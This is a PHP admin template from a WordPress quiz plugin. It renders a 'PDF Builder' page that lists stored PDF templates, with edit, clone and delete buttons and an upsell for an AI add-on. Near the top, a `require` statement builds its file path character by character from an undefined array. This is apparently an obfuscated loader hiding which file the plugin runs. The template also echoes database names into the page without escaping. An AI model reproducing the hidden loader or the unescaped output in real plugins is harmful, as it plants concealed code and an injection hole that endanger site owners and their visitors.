<?php


include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>

<div class="d-flex justify-content-between align-items-center mb-4" style="border-bottom: 1px solid #eee;">
    <h3 class="quiz--title m-0 border-bottom-0 "><i class="fa fa-cog" aria-hidden="true"></i> PDF Builder</h3>
</div>

<?php 
global $wpdb,$sqb_pdf_content;
$tableName = $wpdb->prefix . $sqb_pdf_content;
$sql = "SELECT * FROM " . $tableName;
$results = $wpdb->get_results( $sql);

$AIQActivated = get_option('AIQActivated', '');
$isAdvPDF = false;
if(defined('APQ_FILE') && isset($AIQActivated) && $AIQActivated == 'Y'){
	$isAdvPDF = true;
}

if(!$isAdvPDF){
	?>
	<div class="member-MP--card mb-4 sqb_member_page_table_wrapper position-relative sqb-card-outer-gray ">
		<div class="have-no-member-pages small-member-message" > 
			<div class="empty-no-pages-section" >
				<div class="advanced-pdf-message">
					<h2>Welcome to the Advanced PDF Builder.</h2>
					<div class="pdf-ai-not-active mt-3">
						<p>We noticed you don't have access to the Advanced PDF Builder.</p>
						<p>You need to have our AI Add-On/Plugin to use the Advanced PDF Builder.</p>
					</div>
					<a href="https://smartquizbuilder.com/ai" target="_blank" class="signup-ai-btn">Click Here to Signup for AI Add-On</a>
				</div>
			</div>
		</div>
	</div>

	<?php
}else if(!empty($results)){
	?>
	<div class="member-MP--card mb-4 sqb_member_page_table_wrapper     position-relative   sqb-card-outer-gray " bis_skin_checked="1">
		<div class="alert alert-success sqb-page-delete-alert" role="alert" bis_skin_checked="1">Deleted Successfully!</div>
		<div class="sqb-pdf-content-buttons">
			<a href="<?php echo admin_url('admin.php?page=sqb_create_pdf_content_page'); ?>" class="absoluteBtn btn create--btn mp_add_new_pages_btn mb-4 d-inline-block mp_type_engagement">Create a New PDF</a>

			<a href="javascript:void(0);" class="see-pdf-mapping">See Existing Mappings</a>
		</div>
		<div id="sqb_member_page_table_wrapper" class="dataTables_wrapper">
			
			<table class="table hover table-bordered table-striped sqb_member_page_table_class sqb_member_page_table_engagement " id="sqb_member_page_table" style="" attribute_table_type="single_type_page" member_page_type="engagement" role="grid" aria-describedby="sqb_member_page_table_info">
				<thead>
					<tr role="row">
					<th style="width:200px;" class="sorting" tabindex="0" rowspan="1" colspan="1" >Name</th>
					<th class="sqb_member_date_info text-center sorting_desc" style="width:100px;" tabindex="0" rowspan="1" colspan="1" aria-sort="descending">Date</th>
					<th style="width:50px;" class="text-center sorting" tabindex="0"rowspan="1" colspan="1" >Action</th>
					</tr>
				</thead>
				<tbody>
					<?php foreach ($results as $key => $row) {
						$id = $row->id;
						$short_date = $row->date;
						if($short_date == '0000-00-00 00:00:00'){
							$shortcode_date = date('m-d-Y');
						}else{
							$shortcode_date = date('m-d-Y', strtotime($short_date));
						}
						?>
						<tr class="sqb_member_manage_page_row_id_<?php echo $id ?> odd" role="row">
							<td align="left"><?php echo $row->name ?></td>
							<td align="center" class="sorting_1"><?php echo $shortcode_date; ?></td>
							<td align="center"><div style="display:none;"><?php echo $id ?></div><a class="btn btn-info btn-sm" href="<?php echo admin_url('admin.php?page=sqb_create_pdf_content_page&id='.$id); ?>"><i class="fa fa-pencil"></i></a><a class="btn btn-warning btn-sm clone_pdf_content_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-clone"></i></a> <a class="btn btn-danger btn-sm delete_pdf_content_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-trash"></i></a></td>
						</tr>
					<?php } ?>
				</tbody>
			</table>
			
		</div>
		</div>
	<?php
}else{
	?>

	<div class="member-MP--card mb-4 sqb_member_page_table_wrapper position-relative sqb-card-outer-gray ">
		<div class="have-no-member-pages small-member-message" > 
			<div class="empty-no-pages-section" >
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.65 28.65 0 64 0H224V128C224 145.7 238.3 160 256 160H384V198.6C310.1 219.5 256 287.4 256 368C256 427.1 285.1 479.3 329.7 511.3C326.6 511.7 323.3 512 320 512H64C28.65 512 0 483.3 0 448V64zM256 128V0L384 128H256zM288 368C288 288.5 352.5 224 432 224C511.5 224 576 288.5 576 368C576 447.5 511.5 512 432 512C352.5 512 288 447.5 288 368zM448 303.1C448 295.2 440.8 287.1 432 287.1C423.2 287.1 416 295.2 416 303.1V351.1H368C359.2 351.1 352 359.2 352 367.1C352 376.8 359.2 383.1 368 383.1H416V431.1C416 440.8 423.2 447.1 432 447.1C440.8 447.1 448 440.8 448 431.1V383.1H496C504.8 383.1 512 376.8 512 367.1C512 359.2 504.8 351.1 496 351.1H448V303.1z"></path></svg>
				<h2>You don't have any PDF's yet!</h2>
				<p>You can click the button to add a PDF</p>
				<a href="<?php echo admin_url('admin.php?page=sqb_create_pdf_content_page'); ?>" class="manage-member-empty-btn"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add your first PDF</a>
			</div>
		</div>
	</div>
<?php } ?>

<div class="Manage_Side_Popup pdf_mapping_side_popup " >
	
	
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h2>Outcome PDF Mapping</h2>
		<div class="Manage_Side_Popup_content">
			
			<div class="Generate-options-outer">
				
				<div class="Manage_Side_Popup_pdf_mapping_inner">
				
					<div class="pdf-mapping-content">
						
					</div>

				</div>
				
			</div>
		</div>	
		
		
	</div>
</div>

<script>
  jQuery(document).ready(function() {
    jQuery(document).on('click','.sqb-new-accordion-header',function() {
      var accordionItem = jQuery(this).parent('.sqb-new-accordion-item');
      var accordionContent = jQuery(this).next('.sqb-new-accordion-content');
      
      if (accordionItem.hasClass('active')) {
        accordionItem.removeClass('active');
        accordionContent.slideUp();
      } else {
        jQuery('.sqb-new-accordion-item.active').removeClass('active');
        jQuery('.sqb-new-accordion-content').slideUp();
        
        accordionItem.addClass('active');
        accordionContent.slideDown();
      }
    });
  });
</script>